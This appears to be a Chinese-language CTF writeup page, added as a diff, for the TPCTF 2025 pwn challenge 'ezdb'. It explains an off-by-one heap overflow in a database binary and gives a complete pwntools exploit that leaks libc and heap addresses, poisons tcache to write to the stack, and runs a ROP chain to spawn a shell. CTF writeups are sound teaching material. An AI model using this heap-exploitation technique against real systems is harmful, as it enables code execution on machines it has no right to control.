@@ -1,0 +1,165 @@
+export const layout = "#components/Page.js";
+export const title = "TPCTF 2025 Writeup";
+export const description = "2025 TPCTF Pwn 题解";
+export const created = "2025-03-13";
+
+# TPCTF 2025 Writeup
+
+
+和 n1 的师傅一起打了这场比赛，由于不会 web pwn 和 iot，这场基本上只能打签到堆题wwww
+
+师傅们 tql
+
+## ezdb
+
+
+Glibc 2.35，洞在这里：
+
+```c
+__int16 __fastcall TablePage::InsertRecord(TablePage *this, Record *record)
+{
+  int Size; // [rsp+10h] [rbp-10h]
+  int v4; // [rsp+14h] [rbp-Ch]
+
+  Size = Record::GetSize(record);
+  if ( TablePage::GetFreeSpaceSize(this) < (Size + 4LL) )
+    return -1;
+  LOWORD(v4) = this->end - Size - this->page;
+  HIWORD(v4) = Size;
+  *this->start = v4;
+  this->start = (this->start + 4);
+  memcpy(this->end - Size, record->content, Size);  // off by one
+  this->end = (this->end - Size);
+  return (LOWORD(this->start) - 4 - LOWORD(this->page)) >> 2;
+}
+```
+
+这个地方有一个溢出，可以修改 Page 的 length，这个 length 会被用在后面 `show` 和 `edit` 功能里，例如 `edit`：
+
+```c
+__int64 __fastcall TablePage::EditRecord(TablePage *this, unsigned __int16 slot, Record *new_rec)
+{
+  int length; // ebx
+  int Size; // eax
+  unsigned __int16 *v7; // [rsp+28h] [rbp-18h]
+
+  if ( slot >= TablePage::GetSlotNum(this) )
+    return 0LL;
+  v7 = this->d + 2 * slot;
+  length = v7[1];
+  if ( length < Record::GetSize(new_rec) )
+    return 0LL;
+  Size = Record::GetSize(new_rec);
+  memcpy(this->page + *v7, new_rec->content, Size);
+  return 1LL;
+}
+```
+
+通过溢出可以把这里的 `length` 写成一个比较大的数字，从而 `Record::GetSize(new_rec)` 可以更大一点，也就是 `memcpy` 时 `Size` 更大一点，从而导致堆溢出。
+
+所以这里有几乎无限的任意地址读写原语，tcache posioning 打栈即可。
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+from sys import argv
+
+proc = "./db_patched"
+context.log_level = "debug"
+context.binary = proc
+elf = ELF(proc, checksec=False)
+libc = ELF("./libc.so.6", checksec=False)
+io = remote("", ) if argv[1] == 'r' else process(proc)
+
+if args.G:
+    gdb.attach(io, "breakrva 0x1fe2")
+
+
+def choose(op):
+    io.sendlineafter(b">>>", str(op).encode())
+
+
+def create(idx):
+    choose(1)
+    io.sendlineafter(b": ", str(idx).encode())
+
+
+def remove(idx):
+    choose(2)
+    io.sendlineafter(b": ", str(idx).encode())
+
+
+def insert(idx, length, content):
+    choose(3)
+    io.sendlineafter(b"Index: ", str(idx).encode())
+    io.sendlineafter(b"Varchar Length:", str(length).encode())
+    io.sendlineafter(b"Varchar: ", content)
+    io.recvuntil(b"slot id: ")
+    slot_id = int(io.recvuntil(b"\n", drop=True))
+    return slot_id
+
+
+def show(idx, slot_id):
+    choose(4)
+    io.sendlineafter(b"Index: ", str(idx).encode())
+    io.sendlineafter(b"ID: ", str(slot_id).encode())
+
+
+def edit(idx, slot_id, length, content):
+    choose(5)
+    io.sendlineafter(b"Index: ", str(idx).encode())
+    io.sendlineafter(b"Slot ID: ", str(slot_id).encode())
+    io.sendlineafter(b"Length: ", str(length).encode())
+    io.sendlineafter(b"Varchar: ", content)
+
+
+create(10)
+create(0)
+insert(0, 0x401 - 4, b"\x08" + b"a" * (0x401 - 5))
+
+for i in range(1, 9):
+    create(i)
+for i in range(1, 9):
+    remove(9 - i)
+show(0, 0)
+io.recvuntil(b"Varchar: ")
+io.recv(0x415)
+heap_leak = u64(io.recv(8))
+io.recv(0x38)
+main_arena = u64(io.recv(8))
+io.recv(0x418)
+posion = u64(io.recv(8))
+libc_base = main_arena - 0x21ace0
+heap_addr = heap_leak - 3 - 0x480
+log.info(f"libc_base => {hex(libc_base)}\nheap_addr => {hex(heap_addr)}")
+log.info(f"posion => {hex(posion)}")
+environ = libc_base + libc.sym['environ']
+log.info(f"environ => {hex(environ)}")
+
+binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
+pop_rdi_ret = libc_base + libc.search(asm("pop rdi; ret;")).__next__()
+ret = libc_base + 0x0000000000029139
+system = libc_base + libc.sym['system']
+
+create(1)
+insert(10, 0x401 - 4, b"\x04" + b"a" * (0x401 - 5))
+
+payload = b"c" * (0x400 - 3)
+payload += flat([0, 0x31, environ - 3])
+edit(10, 0, len(payload), payload)
+
+show(0, 0)
+io.recvuntil(b'Varchar: ')
+stack_addr = u64(io.recv(8)) - 0x120
+log.info(f"stack_addr => {hex(stack_addr)}")
+
+payload = b"d" * (0x400 - 3)
+payload += flat([0, 0x31, stack_addr - 3])
+edit(10, 0, len(payload), payload)
+# input()
+payload2 = flat([pop_rdi_ret, binsh, ret, system])
+edit(0, 0, len(payload2), payload2)
+choose(6)
+io.interactive()
+```
